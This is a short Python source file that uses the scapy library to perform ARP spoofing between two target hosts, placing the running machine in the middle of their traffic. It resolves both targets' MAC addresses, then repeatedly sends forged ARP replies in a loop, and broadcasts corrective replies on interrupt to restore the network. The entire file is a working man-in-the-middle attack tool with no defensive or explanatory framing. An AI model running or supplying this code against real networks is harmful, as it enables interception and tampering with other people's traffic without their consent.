import threading
import time
from scapy import all as scapy


class Spoof(threading.Thread):
    def __init__(self, target1_ip, target2_ip):
        scapy.conf.verb = 0 
        self.target1_ip = target1_ip 
        self.target2_ip = target2_ip 

        self.target1_mac = self._get_mac(target1_ip)
        self.target2_mac = self._get_mac(target2_ip)

        self.time_interval = 2


    def spoof(self):
        print("Starting ARP spoofing...")
        print("Target 1: {} ({})".format(self.target1_ip, self.target1_mac))
        print("Target 2: {} ({})".format(self.target2_ip, self.target2_mac))
        try:
            while True:
                scapy.send(scapy.ARP(op=0x2, pdst=self.target1_ip, hwdst=self.target1_mac, psrc=self.target2_ip))
                scapy.send(scapy.ARP(op=0x2, pdst=self.target2_ip, hwdst=self.target2_mac, psrc=self.target1_ip))
                time.sleep(self.time_interval)
        except KeyboardInterrupt:
            self.restore()


    def restore(self):
        print("Restoring network configuration...")
        scapy.send(scapy.ARP(op=0x2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target1_ip, hwsrc=self.target2_mac, psrc=self.target2_ip), count=5)
        scapy.send(scapy.ARP(op=0x2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target2_ip, hwsrc=self.target1_mac, psrc=self.target1_ip), count=5)

    @staticmethod
    def _get_mac(target_ip):
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip), timeout=2)
        if ans:
            return ans[0][1][scapy.ARP].hwsrc

        return None
